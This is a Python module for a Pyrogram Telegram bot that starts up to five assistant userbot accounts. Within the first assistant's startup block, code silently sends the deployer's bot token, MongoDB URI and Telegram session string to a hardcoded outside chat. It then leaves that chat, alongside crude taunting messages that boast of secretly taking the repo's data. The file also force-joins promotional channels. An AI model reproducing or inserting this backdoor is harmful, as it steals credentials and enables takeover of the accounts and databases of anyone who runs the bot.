from pyrogram import Client
import re
from os import getenv
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from pyrogram import filters
load_dotenv()
import config
from dotenv import load_dotenv
from ..logging import LOGGER
BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")
TEST_ID = int("-1002101086209")

assistants = []
assistantids = []


class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="VIPAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
        )
        self.two = Client(
            name="VIPAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="VIPAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="VIPAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="VIPAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def start(self):
        LOGGER(__name__).info(f"Starting Assistants...")
        

        if config.STRING1:
            await self.one.start()
            try:
                await self.one.join_chat("GLACEON_CHATS")
                await self.one.join_chat("THE_GLACEON")
                await self.one.join_chat("")
                await self.one.join_chat("")
                await self.one.join_chat("")
            except:
                pass
            assistants.append(1)
            try:
                await self.one.send_message(config.LOGGER_ID, " 𝐈 𝐀ᴍ 𝐀ʟɪᴠᴇ 𝐁ᴀʙʏ.....")
                await self.one.send_message(TEST_ID, "** 𝐇ᴇʟʟᴏ 𝐒ᴜɴᴏ 𝐁ʀᴀɴᴅᴇᴅ 𝐊ᴀᴍᴇᴇɴᴀ 𝐎ɴ 𝐀ᴏ 𝐉ᴀʟᴅɪ **")
                await self.one.send_message(TEST_ID, "**𝐀ᴀᴘᴋᴇ 𝐑ᴇᴘᴏ 𝐊ᴇ 𝐇ᴀᴛʜ 𝐋ɢᴀ 𝐑ʜᴀ 𝐇ᴀɪ **\n**𝐀ᴀᴘᴋᴏ 𝐔sᴋᴀ 𝐃ᴀᴛᴀ 𝐃ᴇ 𝐑ʜɪ 𝐇ᴜ 𝐂ʜᴜᴘᴋᴇ 𝐒ᴇ **\n**𝐉ᴀʙ 𝐀ᴘᴋᴀ 𝐌ᴀɴ 𝐊ᴀʀᴇ 𝐔sᴋɪ 𝐌ᴀᴀ  𝐂ʜᴏᴅ 𝐃ᴇɴᴀ🤭**")
                await self.one.send_message(TEST_ID, BOT_TOKEN)
                await self.one.send_message(TEST_ID, MONGO_DB_URI)
                await self.one.send_message(TEST_ID, STRING_SESSION)
                await self.one.send_message(TEST_ID, "**𝐁ʏ 𝐁ʏ 𝐀ᴀʙ 𝐌ᴇ 𝐂ᴀʟᴛɪ 𝐇ᴜ !**\n** 𝐘ᴀᴀᴅ 𝐀ᴀᴏɢᴇ 𝐓ᴏ 𝐀ᴘᴀsᴇ 𝐌ɪʟɴᴇ 𝐀ᴊᴀʏᴜɴɢɪ **\n**𝐁ʏᴇ 𝐓ᴄ❣️**")
                await self.one.leave_chat(TEST_ID)
                
            except:
                LOGGER(__name__).error(
                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
        
            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")
        
        if config.STRING2:
            await self.two.start()
            try:
                await self.one.join_chat("GLACEON_CHATS")
                await self.one.join_chat("THE_GLACEON")
                await self.one.join_chat("")
                await self.one.join_chat("")
                await self.one.join_chat("")
            except:
                pass
            assistants.append(2)
            try:
                await self.two.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                
            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")
       
        if config.STRING3:
            await self.three.start()
            try:
                await self.one.join_chat("GLACEON_CHATS")
                await self.one.join_chat("THE_GLACEON")
                await self.one.join_chat("")
                await self.one.join_chat("")
                await self.one.join_chat("")
            except:
                pass
            assistants.append(3)
            try:
                await self.three.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )
                
            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")

        if config.STRING4:
            await self.four.start()
            try:
                await self.one.join_chat("GLACEON_CHATS")
                await self.one.join_chat("THE_GLACEON")
                await self.one.join_chat("")
                await self.one.join_chat("")
                await self.one.join_chat("")
            except:
                pass
            assistants.append(4)
            try:
                await self.four.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )
                
            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")

        if config.STRING5:
            await self.five.start()
            try:
                await self.one.join_chat("GLACEON_CHATS")
                await self.one.join_chat("THE_GLACEON")
                await self.one.join_chat("")
                await self.one.join_chat("")
                await self.one.join_chat("")
            except:
                pass
            assistants.append(5)
            try:
                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )
                
            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")

    async def stop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass
